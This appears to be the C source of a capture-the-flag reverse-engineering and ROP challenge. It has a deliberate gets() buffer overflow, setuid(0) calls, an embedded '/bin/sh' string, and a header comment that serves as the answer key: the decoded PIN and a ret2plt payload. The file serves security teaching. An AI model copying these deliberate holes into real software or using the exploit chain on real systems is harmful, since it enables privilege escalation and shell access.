/*
 * Nexus Corp Secure Vault — vault.c
 * ===================================
 * CTF Challenge: Stage 06 | Reverse Engineering + ROP
 *
 * PART 1 — Logic Reversal (Reversing XOR Encryption):
 *   The security PIN is XOR-encrypted in the binary with key 0x42.
 *   Students must inspect the binary in GDB or Ghidra to find ENC_PIN[],
 *   apply the key, and recover the 4-digit PIN: 1337
 *
 *   GDB method:
 *     $ gdb ./vault.elf
 *     (gdb) x/4xb &ENC_PIN     → 0x73 0x71 0x71 0x75
 *     XOR each byte with 0x42:
 *       0x73 ^ 0x42 = 0x31 = '1'
 *       0x71 ^ 0x42 = 0x33 = '3'
 *       0x71 ^ 0x42 = 0x33 = '3'
 *       0x75 ^ 0x42 = 0x37 = '7'
 *     PIN = "1337"
 *
 * PART 2 — Return Oriented Programming (ret2plt):
 *   After entering the correct PIN, secure_input() is called.
 *   It uses gets() with a 64-byte buffer — no bounds checking.
 *   There is NO print_flag() function. Students must build a ROP chain.
 *
 *   Compiled with: -no-pie -fno-stack-protector
 *   → Fixed binary addresses, no canary, NX enabled (stack not executable)
 *   → Forces ROP (cannot inject shellcode directly)
 *
 *   ROP Chain (ret2plt approach):
 *     offset    = 72 bytes  (64 buf + 8 saved_rbp)
 *     pop_rdi   = ROPgadget --binary vault.elf | grep "pop rdi"
 *     binsh_ptr = objdump -s -j .data vault.elf | grep "/bin/sh"  [or: next(elf.search(b'/bin/sh'))]
 *     ret_align = any bare "ret" gadget  (stack 16-byte alignment for system)
 *     system    = readelf -s --use-dynamic vault.elf | grep system  (PLT addr)
 *
 *   Payload = b'A'*72 + p64(pop_rdi) + p64(binsh_ptr) + p64(ret_align) + p64(system_plt)
 *
 *   See solve.py for the full pwntools exploit script.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* ── XOR-encrypted PIN (key = 0x42) ─────────────────────────────────────
 * Encrypted : {0x73, 0x71, 0x71, 0x75}
 * Decrypted : "1337"
 * Students must XOR each byte with 0x42 to recover the PIN.
 */
static const unsigned char ENC_PIN[] = {0x73, 0x71, 0x71, 0x75};
static const unsigned char XOR_KEY   = 0x42;

/* ── /bin/sh string anchored in .data (used as ROP gadget argument) ─────
 * objdump -s -j .data vault.elf   → find address of this string
 * This lets students perform ret2plt without needing libc base address.
 */
const char SHELL_PATH[] = "/bin/sh";

/* ── Buffer overflow target ──────────────────────────────────────────────
 * Called only after PIN verification.
 * gets() provides the overflow primitive.
 * Stack layout (x86-64):
 *   [buf: 64 bytes] [saved_rbp: 8 bytes] [saved_rip: 8 bytes]
 *   Offset to RIP = 64 + 8 = 72 bytes
 */
void secure_input(void)
{
    char buf[64];
    printf("\n[VAULT] Enter master passphrase: ");
    fflush(stdout);
    gets(buf);   /* <-- VULNERABLE: no bounds check → buffer overflow */
    printf("[!] Passphrase rejected. Vault remains sealed.\n");
}

int main(void)
{
    char     pin_input[16];
    char     decrypted[5];
    int      i;

    /* Prevent dash from dropping privileges when system() is called via ROP */
    setuid(0);
    setgid(0);

    /* Ensure system() is imported into PLT for the ROP chain */
    system("echo '[*] Vault initializing...' > /dev/null");

    /* Decrypt PIN at runtime (simple XOR loop) */
    for (i = 0; i < 4; i++)
        decrypted[i] = ENC_PIN[i] ^ XOR_KEY;
    decrypted[4] = '\0';

    printf("╔══════════════════════════════════════╗\n");
    printf("║    NEXUS CORP SECURE VAULT  v2.0     ║\n");
    printf("║    Classified Asset Storage System   ║\n");
    printf("╚══════════════════════════════════════╝\n\n");
    printf("[*] Vault integrity check  : PASSED\n");
    printf("[*] Encryption status      : ACTIVE\n");
    printf("[*] Authorised users online: 0\n\n");
    printf("[AUTH] Enter Security PIN  : ");
    fflush(stdout);

    if (fgets(pin_input, sizeof(pin_input), stdin) == NULL) {
        fprintf(stderr, "Input error.\n");
        return 1;
    }
    pin_input[strcspn(pin_input, "\n")] = '\0';

    if (strcmp(pin_input, decrypted) != 0) {
        printf("\n[!] ACCESS DENIED — Invalid PIN. Incident logged.\n");
        return 1;
    }

    printf("[+] PIN verified. Unlocking secure input channel...\n");

    /* Expose the buffer overflow surface */
    secure_input();

    return 0;
}
